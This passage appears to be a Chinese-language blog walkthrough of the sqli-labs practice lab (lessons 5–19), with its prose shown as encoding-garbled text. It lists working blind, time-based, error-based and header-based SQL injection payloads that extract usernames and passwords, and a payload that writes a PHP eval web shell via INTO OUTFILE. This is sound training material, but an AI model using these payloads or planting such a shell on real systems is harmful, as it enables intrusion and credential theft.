<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222854581.png" class>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),1,8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),1,8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223125374.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223201941.png" class>

<p><code>çˆ†æ•°æ®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223440143.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223459949.png" class>

<p><strong><em>skipï¼šè¿™ç§æ–¹æ³•å°±æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œç´¯å‚»å°å­çš„æ´»å»ºè®®sqlmapğŸ’‚â€â™€ï¸</em></strong></p>
<h3 id="3-ç¬¬ä¸‰ç§æ–¹æ³•-åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥"><a href="#3-ç¬¬ä¸‰ç§æ–¹æ³•-åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥" class="headerlink" title="3.ç¬¬ä¸‰ç§æ–¹æ³•(åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥)"></a>3.ç¬¬ä¸‰ç§æ–¹æ³•(åˆ©ç”¨æ—¶é—´å»¶æ—¶æ³¨å…¥)</h3><p><code>çˆ†åº“åé•¿åº¦ï¼Œè¿™é‡Œä¾æ—§å¯ä»¥ä½¿ç”¨intruder</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(length(database())=8,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190911402.png" class>

<p><code>çˆ†åº“</code></p>
<p><code>ä¹Ÿå¯ä»¥å°†length()æ¢ä¸ºsubstr()</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/id=1&#x27; and if(left(database(),8)=&#x27;security&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191846689.png" class>

<p><code>çˆ†è¡¨ï¼Œç¬¬å››å¼ è¡¨ä¸ºusers</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;users&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191536441.png" class>

<p><code>çˆ†usersè¡¨çš„å­—æ®µ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),8)=&#x27;id&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192412154.png" class>

<p><code>ç¬¬äºŒä¸ªå­—æ®µä¸ç¬¬ä¸‰ä¸ªå­—æ®µä¸ºusernameã€password</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),8)=&#x27;username&#x27;,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),8)=&#x27;password&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192640873.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192551041.png" class>

<p><code>çˆ†æ•°æ®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select username from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select password from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193118321.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193031194.png" class>

<p><strong><em>skipï¼šåŒæ ·ä½¿ç”¨intruderè¿›è¡Œçˆ†ç ´æ˜¯ä¸€ä¸ªä¸é”™çš„æ‰‹æ®µ</em></strong></p>
<h2 id="0x06-Less-6-GET-åŒæ³¨å…¥-åŒå¼•å·"><a href="#0x06-Less-6-GET-åŒæ³¨å…¥-åŒå¼•å·" class="headerlink" title="0x06.Less-6 GET åŒæ³¨å…¥ åŒå¼•å·"></a>0x06.Less-6 GET åŒæ³¨å…¥ åŒå¼•å·</h2><p><code>åŒLess5ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·å³å¯</code></p>
<h2 id="0x07-Less-7-GET-Dumpå‡½æ•°-å¯¼å‡ºæ–‡ä»¶"><a href="#0x07-Less-7-GET-Dumpå‡½æ•°-å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="0x07.Less-7 GET Dumpå‡½æ•° å¯¼å‡ºæ–‡ä»¶"></a>0x07.Less-7 GET Dumpå‡½æ•° å¯¼å‡ºæ–‡ä»¶</h2><p><code>é¦–å…ˆéœ€è¦çŸ¥é“webåå°çš„è·¯å¾„æ ¼å¼ï¼Œè¿™é‡Œä½¿ç”¨Less-1ï¼Œèœç‹—çš„æˆ‘æ²¡æœ‰æƒ³åˆ°å…¶ä»–å¥½åŠæ³•.....</code></p>
<blockquote>
<p>IISé»˜è®¤è·¯å¾„æ˜¯    C:\Inetpub\wwwroot</p>
<p>nginxä¸€èˆ¬æ˜¯    /usr/local/nginx/htmlï¼Œ/home/wwwroot/defaultï¼Œ/usr/share/nginxï¼Œ/var/www/htmç­‰</p>
<p>apacheæ˜¯    /var/www/htmlï¼Œ/var/www/html/htdocs</p>
<p>phpstudy å°±æ˜¯    \PhpStudy\WWW\</p>
<p>xammp å°±æ˜¯    \xampp\htdocs</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,@@basedir,@@datadir -- -</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å…¶ä¸­basedirä¸ºMySQL çš„å®‰è£…è·¯å¾„ï¼Œdatadirä¸ºMySQL çš„æ•°æ®åº“æ–‡ä»¶è·¯å¾„</p>
</blockquote>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101215105882.png" class>

<p><code>å¯ä»¥çŒœåˆ°webè·¯å¾„ä¸ºC:\phpstudy\wwwï¼Œä¹‹åå°±å¯ä»¥ä¸Šä¼ æ–‡ä»¶</code></p>
<p><code>è¿™é‡Œå·²ç»æ¢æµ‹åˆ°é—­åˆå­—ç¬¦ä¸º&#39;))</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-7/?id=0&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;demo&quot;]);?&gt;&#x27; into outfile &quot;C:\\phpStudy\\www\\sqli\\less-7\\demo.php&quot; -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220528860.png" class>

<p><code>è®¿é—®demo.phpæŸ¥çœ‹æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸ</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220623654.png" class>

<p><code>ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220848719.png" class>

<h2 id="0x08-Less-8-GET-åŸºäºbool-ç›²æ³¨-å•å¼•å·"><a href="#0x08-Less-8-GET-åŸºäºbool-ç›²æ³¨-å•å¼•å·" class="headerlink" title="0x08.Less-8 GET åŸºäºbool ç›²æ³¨ å•å¼•å·"></a>0x08.Less-8 GET åŸºäºbool ç›²æ³¨ å•å¼•å·</h2><blockquote>
<p>åŒLess5 æ–¹æ³•äºŒ</p>
</blockquote>
<h2 id="0x09-Less-9-GET-åŸºäºæ—¶é—´-ç›²æ³¨-å•å¼•å·"><a href="#0x09-Less-9-GET-åŸºäºæ—¶é—´-ç›²æ³¨-å•å¼•å·" class="headerlink" title="0x09.Less-9 GET åŸºäºæ—¶é—´ ç›²æ³¨ å•å¼•å·"></a>0x09.Less-9 GET åŸºäºæ—¶é—´ ç›²æ³¨ å•å¼•å·</h2><p><code>æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½åªæœ‰You are in...</code></p>
<blockquote>
<p>åŒLess5 æ–¹æ³•ä¸‰</p>
</blockquote>
<h2 id="0x010-Less-10-GET-åŸºäºæ—¶é—´-ç›²æ³¨-åŒå¼•å·"><a href="#0x010-Less-10-GET-åŸºäºæ—¶é—´-ç›²æ³¨-åŒå¼•å·" class="headerlink" title="0x010.Less-10 GET åŸºäºæ—¶é—´ ç›²æ³¨ åŒå¼•å·"></a>0x010.Less-10 GET åŸºäºæ—¶é—´ ç›²æ³¨ åŒå¼•å·</h2><blockquote>
<p>åŒLess9ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·</p>
</blockquote>
<h2 id="0x011-Less-11-POST-åŸºäºæŠ¥é”™-å•å¼•å·"><a href="#0x011-Less-11-POST-åŸºäºæŠ¥é”™-å•å¼•å·" class="headerlink" title="0x011.Less-11 POST åŸºäºæŠ¥é”™ å•å¼•å·"></a>0x011.Less-11 POST åŸºäºæŠ¥é”™ å•å¼•å·</h2><p><code>unameå­˜åœ¨æ³¨å…¥</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100217440.png" class>

<p><code>æµ‹è¯•å‘ç°åªå­˜åœ¨ä¸¤ä¸ªå­—æ®µ</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100626749.png" class>

<p><code>ä¸¾ä¸ªæ —å­</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100826775.png" class>

<blockquote>
<p>å…¶ä»–æ–¹æ³•å¦‚Less-1</p>
</blockquote>
<h2 id="0x12-Less-12-POST-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·"><a href="#0x12-Less-12-POST-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·" class="headerlink" title="0x12.Less-12 POST åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·"></a>0x12.Less-12 POST åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·</h2><p><code>åŒLess-11ï¼Œåªéœ€è¦å°†å•å¼•å·æ¢ä¸ºåŒå¼•å·åŠ æ‹¬å·å³å¯</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname=admin&quot;) -- -&amp;passwd=pass&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h2 id="0x13-Less-13-POST-åŒæ³¨å…¥-å•å¼•å·-æ‹¬å·"><a href="#0x13-Less-13-POST-åŒæ³¨å…¥-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x13.Less-13 POST åŒæ³¨å…¥ å•å¼•å·+æ‹¬å·"></a>0x13.Less-13 POST åŒæ³¨å…¥ å•å¼•å·+æ‹¬å·</h2><p><code>åŒLess-5</code></p>
<blockquote>
<p>æ–¹æ³•ä¸€ã€äºŒã€ä¸‰å‡å¯ç”¨</p>
</blockquote>
<p><code>æ–¹æ³•1</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110042606.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110103120999.png" class>

<p><code>æ–¹æ³•äºŒ</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110308320.png" class>

<p><code>æ–¹æ³•ä¸‰</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110528568.png" class>

<h2 id="0x14-Less-14-POST-åŒæ³¨å…¥-åŒå¼•å·"><a href="#0x14-Less-14-POST-åŒæ³¨å…¥-åŒå¼•å·" class="headerlink" title="0x14.Less-14 POST åŒæ³¨å…¥ åŒå¼•å·"></a>0x14.Less-14 POST åŒæ³¨å…¥ åŒå¼•å·</h2><blockquote>
<p>åŒLess-13ï¼Œå°†å•å¼•å·+æ‹¬å·æ¢ä¸ºåŒå¼•å·å³å¯</p>
</blockquote>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111000136.png" class>

<h2 id="0x15-Less-15-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-å•å¼•å·"><a href="#0x15-Less-15-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-å•å¼•å·" class="headerlink" title="0x15.Less-15 POST åŸºäºæ—¶é—´/boolç›²æ³¨ å•å¼•å·"></a>0x15.Less-15 POST åŸºäºæ—¶é—´/boolç›²æ³¨ å•å¼•å·</h2><p><code>åŒLess-5çš„æ–¹æ³•äºŒä¸æ–¹æ³•ä¸‰</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111527544.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111652045.png" class>

<h2 id="0x16-Less-1-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-åŒå¼•å·-æ‹¬å·"><a href="#0x16-Less-1-POST-åŸºäºæ—¶é—´-boolç›²æ³¨-åŒå¼•å·-æ‹¬å·" class="headerlink" title="0x16.Less-1 POST åŸºäºæ—¶é—´/boolç›²æ³¨ åŒå¼•å·+æ‹¬å·"></a>0x16.Less-1 POST åŸºäºæ—¶é—´/boolç›²æ³¨ åŒå¼•å·+æ‹¬å·</h2><blockquote>
<p>åŒLess-15ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å·+æ‹¬å·å³å¯</p>
</blockquote>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110112154590.png" class>

<h2 id="0x17-Less-17-POST-åŸºäºé”™è¯¯-æ›´æ–°æŸ¥è¯¢"><a href="#0x17-Less-17-POST-åŸºäºé”™è¯¯-æ›´æ–°æŸ¥è¯¢" class="headerlink" title="0x17.Less-17 POST åŸºäºé”™è¯¯ æ›´æ–°æŸ¥è¯¢"></a>0x17.Less-17 POST åŸºäºé”™è¯¯ æ›´æ–°æŸ¥è¯¢</h2><p><code>æŸ¥çœ‹æºç å‘ç°ï¼Œå½“unameçš„å€¼åé¢æœ‰ç‰¹æ®Šç¬¦å·ä¼šåŠ ä¸Šä¸€ä¸ª/è¿›è¡Œè½¬ä¹‰</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>æ ¹æ®é¢˜ç›®æç¤ºä¸æºç æ¨æµ‹passwdä¸ºæ³¨å…¥ç‚¹</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110114238770.png" class>

<p><code>payloadåŒLess-5çš„æ–¹æ³•ä¸€</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110120051232.png" class>

<p><code>è¿™é‡Œç›´æ¥ä½¿ç”¨ä»¥ä¸‹payloadä¼šæŠ¥é”™ï¼Œusersä¸èƒ½è¢«ä¿®æ”¹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122233780.png" class>

<p><code>å¯¹payloadè¿›è¡ŒåµŒå¥—ï¼Œä¿®æ”¹ä¸ºå¦‚ä¸‹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as demo),0x7e),1) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122126131.png" class>

<p><code>å…¶ä»–æ³¨å…¥ä¸åœ¨èµ˜è¿°</code></p>
<h2 id="0x18-Less-18-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Uagent-field"><a href="#0x18-Less-18-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Uagent-field" class="headerlink" title="0x18.Less-18 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Uagent-field"></a>0x18.Less-18 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Uagent-field</h2><p><code>æŸ¥çœ‹æºç </code></p>
<blockquote>
<p>å¯ä»¥å‘ç°ï¼Œè¿™é‡Œçš„$unameä¸$passwdéƒ½åšäº†è¿‡æ»¤ï¼Œå³å½“å­˜åœ¨ç‰¹æ®Šå­—ç¬¦æ—¶åŠ ä¸Š/è¿›è¡Œè½¬ä¹‰</p>
<p>å¹¶ä¸”insertå‡½æ•°å°†Uagentæ’å…¥åˆ°äº†æ•°æ®åº“</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    $IP = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">//echo &#x27;Your User Agent is: &#x27; .$uagent;</span></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    $uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Your User name:&#x27;. $uname;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Password:&#x27;. $passwd;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $uagent;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $IP;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//logging the connection parameters to a file for analysis.    </span></span><br><span class="line">    $fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite($fp,<span class="string">&#x27;User Agent:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    fclose($fp);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    $sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">    $result1 = mysql_query($sql);</span><br><span class="line">    $row1 = mysql_fetch_array($result1);</span><br><span class="line">        <span class="keyword">if</span>($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            $insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br><span class="line">            mysql_query($insert);</span><br><span class="line">            <span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;    </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>æ‰€ä»¥ä½¿ç”¨å¦‚ä¸‹payload</code></p>
<blockquote>
<p>updatexmlä¸extractvalueä½œç”¨ç›¸åŒ</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><br><span class="line">andä¸oréƒ½å¯ä»¥ï¼Œåªæ˜¯ä¸ºäº†é—­åˆå•å¼•å·</span><br></pre></td></tr></table></figure>

<p><code>æœåŠ¡å™¨æ‰§è¡Œçš„å‘½ä»¤å¦‚ä¸‹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=&#x27;admin&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27; and users.password=&#x27;&#x27; ORDER BY users.id DESC LIMIT 0,1&quot;</span></span></span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110124944874.png" class>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110133641590.png" class>

<h2 id="0x19-Less-19-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Referer-field"><a href="#0x19-Less-19-POST-åŸºäºæŠ¥é”™-HTTPè¯·æ±‚å¤´-Referer-field" class="headerlink" title="0x19.Less-19 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Referer-field"></a>0x19.Less-19 POST åŸºäºæŠ¥é”™ HTTPè¯·æ±‚å¤´ Referer-field</h2><p><code>åŒLess18ï¼Œåªæ˜¯æ³¨å…¥ç‚¹å˜ä¸ºreferer</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110125136890.png" class>

